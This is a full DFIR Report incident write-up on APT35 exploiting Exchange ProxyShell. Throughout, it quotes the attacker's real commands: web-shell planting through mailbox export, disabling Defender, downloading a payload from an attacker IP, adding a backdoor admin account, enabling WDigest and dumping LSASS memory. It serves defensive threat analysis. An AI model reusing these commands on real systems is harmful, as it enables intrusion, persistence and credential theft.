<div id="date">Monday, March 21, 2022</div>
</div>
</div></div>
</div>
</div>
</header>
<div id="content" class="site-content" style="transform: none;">
<div class="site-content-cell" style="transform: none;">
<div class="wrap" style="transform: none;">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-5981" class="post-5981 post type-post status-publish format-standard hentry category-apt35 category-fast-reverse-proxy category-proxyshell category-uncategorized entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-89" href="https://thedfirreport.com/category/apt35/">APT35</a>
<a class="category-color-87" href="https://thedfirreport.com/category/fast-reverse-proxy/">Fast Reverse Proxy</a>
<a class="category-color-88" href="https://thedfirreport.com/category/proxyshell/">ProxyShell</a>
<a class="category-color-1" href="https://thedfirreport.com/category/uncategorized/">Uncategorized</a>
</span>
</div>
<h1 class="entry-title">APT35 Automates Initial Access Using ProxyShell</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/" rel="bookmark"><time class="entry-date published" datetime="2022-03-21T01:55:06+00:00">March 21, 2022</time></a></span> </div>
</header>
<div class="entry-content">
<p>In December 2021, we observed an adversary exploiting the <a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell" target="_blank" rel="noreferrer noopener">Microsoft Exchange ProxyShell vulnerabilities</a> to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, “<a href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" target="_blank" rel="noreferrer noopener">Exchange Exploit Leads to Domain Wide Ransomware</a>“.</p>
<p>In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post-exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related to <a href="https://attack.mitre.org/groups/G0059/" target="_blank" rel="noreferrer noopener">APT35</a> (TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTP’s mirroring previously reported activity that was <a href="https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/" target="_blank" rel="noreferrer noopener">attributed to the group</a>.</p>
<h2>Case Summary</h2>
<p>The threat actors activity occurred in two bursts within a 3 day time frame. As with our previous case, they started by uploading their web shell and disabling antivirus services.</p>
<p>Soon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the “remote desktop users” and “local administrators users” groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call <a href="https://github.com/fatedier/frp" target="_blank" rel="noreferrer noopener">Fast Reverse Proxy</a> (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.</p>
<p>After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig. At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.&nbsp;</p>
<p>All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out. The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.</p>
<p>Two days later, we saw the threat actors reappear. We expected them to pick up where they left off, however, they repeated all previous actions. Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.</p>
<p>No further activity was observed as the threat actors were evicted from the network.</p>
<h3>Services</h3>
<p>We offer multiple services including a&nbsp;<a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">Threat Feed service</a>&nbsp;which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found&nbsp;<a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<p>We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our&nbsp;<a href="https://www.patreon.com/thedfirreport" target="_blank" rel="noreferrer noopener">Security Researcher and Organization</a>&nbsp;services.</p>
<h2>Timeline</h2>
<p><img class="alignnone size-full wp-image-6005 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png" alt="" width="1080" height="1402" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png 1080w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-231x300.png 231w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-789x1024.png 789w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-768x997.png 768w" data-lazy-sizes="(max-width: 1080px) 100vw, 1080px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img class="alignnone size-full wp-image-6005" src="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png" alt="" width="1080" height="1402" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell.png 1080w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-231x300.png 231w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-789x1024.png 789w, https://thedfirreport.com/wp-content/uploads/2022/03/APT35-Automates-Initial-Access-Using-ProxyShell-768x997.png 768w" sizes="(max-width: 1080px) 100vw, 1080px" /></noscript></p>
<figure class="wp-block-image"></figure>
<p>Analysis and reporting completed by <a href="https://twitter.com/samaritan_o" target="_blank" rel="noreferrer noopener">@samaritan_o</a>, <a href="https://twitter.com/Kostastsale" target="_blank" rel="noreferrer noopener">@kostastsale</a>, <a href="https://twitter.com/svch0st" target="_blank" rel="noreferrer noopener">@svch0st</a> and <a href="https://twitter.com/RoxpinTeddy" target="_blank" rel="noreferrer noopener">@RoxpinTeddy</a>.</p>
<h2>Initial Access</h2>
<p>As&nbsp; similarly seen in our previous report <a href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" target="_blank" rel="noreferrer noopener">Exchange Exploit Leads to Domain Wide Ransomware</a>, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:</p>
<ul>
<li>CVE-2021-34473</li>
<li>CVE-2021-34523</li>
<li>CVE-2021-31207</li>
</ul>
<p>With the appropriate <a href="https://www.mandiant.com/resources/greater-visibilityt" target="_blank" rel="noreferrer noopener">PowerShell logging</a> available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.</p>
<p>Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:</p>
<pre class="wp-block-preformatted">New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "administrator@&lt;REDACTED&gt;"</pre>
<p>The threat actor initiated a mailbox export that matched the search criteria of <code>Subject -eq 'aspx_wkggiyvttmu'</code> to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.</p>
<pre class="wp-block-preformatted">New-MailboxExportRequest -Mailbox "administrator@&lt;REDACTED&gt;" -FilePath "\\localhost\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\aspx_wkggiyvttmu.aspx" -IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_wkggiyvttmu'" </pre>
<p>In an attempt to hide the actions taken, the actor removes the request just created:</p>
<pre class="wp-block-preformatted">Remove-MailboxExportRequest -Confirm "False" -Force "True" -Identity "77a883a7-470c-471c-a193-f4c54f263fde"</pre>
<p>This activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first.</p>
<pre class="wp-block-preformatted">New-MailboxExportRequest -Mailbox "administrator@&lt;REDACTED&gt;" -FilePath "\\localhost\c$\inetpub\wwwroot\aspnet_client\system_web\aspx_dyukbdcxjfi.aspx" -IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_dyukbdcxjfi'"</pre>
<h2><img loading="lazy" class="alignnone size-full wp-image-6007 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png" alt="" width="1673" height="1447" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png 1673w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-300x259.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-1024x886.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-768x664.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-1536x1329.png 1536w" data-lazy-sizes="(max-width: 1673px) 100vw, 1673px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6007" src="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png" alt="" width="1673" height="1447" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain.png 1673w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-300x259.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-1024x886.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-768x664.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/ProxyShell-Exploit-Process-Chain-1536x1329.png 1536w" sizes="(max-width: 1673px) 100vw, 1673px" /></noscript></h2>
<h2>Execution</h2>
<p>Approximately 20 seconds after the web shell <code>aspx_wkggiyvttmu.aspx</code> was created, a flurry of POST requests were sent to the web shell.</p>
<p>The web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell, <code>delimiter</code> which defines what string is used to separate the response, and <code>exec_code</code> which is the command to be ran. The web shell had predefined functions for special actions:</p>
<ul>
<li><code>get</code> – Get file from location on disk (additional <code>dst</code> POST parameter)</li>
<li><code>put</code> – Upload file to location (additional <code>dst</code> POST parameter)</li>
<li><code>run</code> – Execute a list of commands separated by “;” using PowerShell.</li>
</ul>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png"><img loading="lazy" class="aligncenter size-full wp-image-5992 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png" alt="" width="1497" height="819" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png 1497w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-300x164.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-1024x560.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-768x420.png 768w" data-lazy-sizes="(max-width: 1497px) 100vw, 1497px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5992" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png" alt="" width="1497" height="819" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-02.png 1497w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-300x164.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-1024x560.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-02-768x420.png 768w" sizes="(max-width: 1497px) 100vw, 1497px" /></noscript></a></figure>
<p>If <code>exec_code</code> does not start with one of the above commands, it will simply attempt to run it with PowerShell.</p>
<p>The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png"><img loading="lazy" class="aligncenter size-full wp-image-5993 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png" alt="" width="1600" height="503" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png 1600w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-300x94.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-1024x322.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-768x241.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-1536x483.png 1536w" data-lazy-sizes="(max-width: 1600px) 100vw, 1600px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5993" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png" alt="" width="1600" height="503" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-03.png 1600w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-300x94.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-1024x322.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-768x241.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-03-1536x483.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></noscript></a></figure>
<p>The actor first uploaded a file <code>Wininet.xml</code>, which is later used to create a scheduled task, to <code>C:\windows\temp</code> using the <code>put</code> command of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake <code>dllhost.exe</code> from 148.251.71[.]182.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png"><img loading="lazy" class="aligncenter size-full wp-image-5994 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png" alt="" width="1871" height="83" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png 1871w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-1024x45.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-768x34.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-1536x68.png 1536w" data-lazy-sizes="(max-width: 1871px) 100vw, 1871px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5994" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png" alt="" width="1871" height="83" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-04.png 1871w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-1024x45.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-768x34.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-04-1536x68.png 1536w" sizes="(max-width: 1871px) 100vw, 1871px" /></noscript></a></figure>
<p>Scheduled Task Commands:</p>
<pre class="wp-block-preformatted">schtasks.exe /Create /F /XML C:\windows\temp\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'</pre>
<pre class="wp-block-preformatted">schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'</pre>
<p>Defender Modification Command:</p>
<pre class="wp-block-preformatted">try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}</pre>
<pre class="wp-block-preformatted">Start-Process powershell.exe {$file='c:\windows\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file} </pre>
<p>The schedule task runs a batch script called <code>Wininet.bat</code> which was also uploaded through the web shell. <code>Wininet.bat</code> simply loops through the execution of the file <code>dllhost.exe</code>.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png"><img loading="lazy" class="aligncenter size-full wp-image-5995 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png" alt="" width="381" height="120" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png 381w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-05-300x94.png 300w" data-lazy-sizes="(max-width: 381px) 100vw, 381px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5995" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png" alt="" width="381" height="120" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-05.png 381w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-05-300x94.png 300w" sizes="(max-width: 381px) 100vw, 381px" /></noscript></a></figure>
<p>The file <code>dllhost.exe</code> is a golang binary. When executed, the binary was observed resolving the following domains:</p>
<ul>
<li>api.myip[.]com (for discovery)</li>
<li>tcp443.msupdate[.]us</li>
<li>kcp53.msupdate[.]us</li>
</ul>
<p>The binary also spawns the following commands when executed:</p>
<ul>
<li>cmd /c wmic computersystem get domain</li>
<li>powershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders</li>
</ul>
<p>The <a href="https://www.virustotal.com/gui/file/1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e/community" target="_blank" rel="noreferrer noopener">binary</a> has a low confidence reference to FRP (<a href="https://github.com/fatedier/frp" target="_blank" rel="noreferrer noopener">FastReverseProxy</a>) as the sample matches the closed source Yara rule – <a href="https://valhalla.nextron-systems.com/info/rule/HKTL_PUA_FRP_FastReverseProxy_Oct21_1" target="_blank" rel="noreferrer noopener">HKTL_PUA_FRP_FastReverseProxy_Oct21_1</a> (by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently – <a href="https://valhalla.nextron-systems.com/info/rule/APT_MAL_Go_FRP_CharmingKitten_Jan22_1" target="_blank" rel="noreferrer noopener">APT_MAL_Go_FRP_CharmingKitten_Jan22_1</a> pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.</p>
<p><img loading="lazy" class="alignnone size-full wp-image-6008 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png" alt="" width="1427" height="511" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png 1427w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-1024x367.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-768x275.png 768w" data-lazy-sizes="(max-width: 1427px) 100vw, 1427px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6008" src="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png" alt="" width="1427" height="511" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution.png 1427w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-1024x367.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/dllhost.exe-Execution-768x275.png 768w" sizes="(max-width: 1427px) 100vw, 1427px" /></noscript></p>
<h2>Persistence</h2>
<p>The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.</p>
<p><strong>New account creation</strong></p>
<p>During the first activity, we observed the use of <code>user.exe</code> executable that ran the following PowerShell command:</p>
<pre class="wp-block-preformatted">powershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount&nbsp;&nbsp; </pre>
<p>The first thing they did was make a new user named <code>DefaultAccount</code> with the password <code>P@ssw0rd123412</code>. They then activated the account and changed the password (<code>P@ssw0rd12341234</code>) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.</p>
<p>The threat actors ran the same command again two days later:</p>
<pre class="wp-block-preformatted">powershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount </pre>
<p>Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.</p>
<p><strong>Scheduled task</strong></p>
<p>As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png"><img loading="lazy" class="aligncenter size-full wp-image-5996 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png" alt="" width="646" height="382" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png 646w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-06-300x177.png 300w" data-lazy-sizes="(max-width: 646px) 100vw, 646px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5996" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png" alt="" width="646" height="382" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.png 646w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-06-300x177.png 300w" sizes="(max-width: 646px) 100vw, 646px" /></noscript></a></figure>
<p>Below, we can observe the content of <strong>wininet.xml</strong>:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png"><img loading="lazy" class="aligncenter size-full wp-image-5998 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png" alt="" width="747" height="899" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png 747w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5-249x300.png 249w" data-lazy-sizes="(max-width: 747px) 100vw, 747px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5998" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png" alt="" width="747" height="899" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5.png 747w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-06.5-249x300.png 249w" sizes="(max-width: 747px) 100vw, 747px" /></noscript></a></figure>
<p>The following commands where then ran to initiate the task and to achieve persistence:</p>
<pre class="wp-block-preformatted">schtasks.exe /Create /F /XML %wintmp%\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet'</pre>
<pre class="wp-block-preformatted">schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'</pre>
<h2>Privilege Escalation</h2>
<p>The scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or SYSTEM.</p>
<pre class="wp-block-preformatted">&lt;UserId&gt;S-1-5-18&lt;/UserId&gt;</pre>
<p>The threat actor also added their newly created account to the local administrator group:</p>
<pre class="wp-block-preformatted">net&nbsp; localgroup administrators /add DefaultAccount&nbsp;</pre>
<h2>Defense Evasion</h2>
<p>Using PowerShell the threat actors issued several commands to impair Windows Defender including:</p>
<ul>
<li>Windows Defender Behavior Monitoring was disabled.</li>
<li>The Severe Threat default action was set to ‘Allow’.</li>
<li>Realtime Monitoring was disabled.</li>
<li>The ‘C:\Windows’ path was excluded from scheduled and real-time scanning.</li>
</ul>
<pre class="wp-block-preformatted">try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}</pre>
<p>A rule was added to the Windows Firewall to allow remote RDP traffic.</p>
<pre class="wp-block-preformatted">"netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389</pre>
<p>Remote Desktop Services was started.</p>
<pre class="wp-block-preformatted">"net" start TermService</pre>
<p>The threat actor enabled WDigest authentication. This enforces the storage of credentials in plaintext on future logins.</p>
<pre class="wp-block-preformatted">"reg" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</pre>
<p>LSA protection was disabled.</p>
<pre class="wp-block-preformatted">"reg" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f</pre>
<h2>Credential Access</h2>
<p>The threat actor created a process memory dump from LSASS.exe. In this case they created a “minidump” using the LOLBIN <a href="https://lolbas-project.github.io/lolbas/Libraries/comsvcs/" target="_blank" rel="noreferrer noopener">comsvcs.dll</a>. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.</p>
<pre class="wp-block-preformatted">"powershell.exe" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive&nbsp; C:\windows\temp\ssasl.pmd&nbsp; C:\windows\temp\ssasl.zip</pre>
<h2><img loading="lazy" class="alignnone size-full wp-image-6003 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/1.png" alt="" width="932" height="227" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/1.png 932w, https://thedfirreport.com/wp-content/uploads/2022/03/1-300x73.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/1-768x187.png 768w" data-lazy-sizes="(max-width: 932px) 100vw, 932px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-6003" src="https://thedfirreport.com/wp-content/uploads/2022/03/1.png" alt="" width="932" height="227" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/1.png 932w, https://thedfirreport.com/wp-content/uploads/2022/03/1-300x73.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/1-768x187.png 768w" sizes="(max-width: 932px) 100vw, 932px" /></noscript></h2>
<h2>Discovery</h2>
<p>The threat actors used native Windows binaries to enumerate the exploited&nbsp;server&nbsp;in an automated fashion. They executed commands such as:</p>
<pre class="wp-block-preformatted">net.exe user</pre>
<pre class="wp-block-preformatted">ipconfig.exe /all</pre>
<pre class="wp-block-preformatted">powershell.exe (multiple commands)</pre>
<pre class="wp-block-preformatted">quser.exe</pre>
<p>These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.</p>
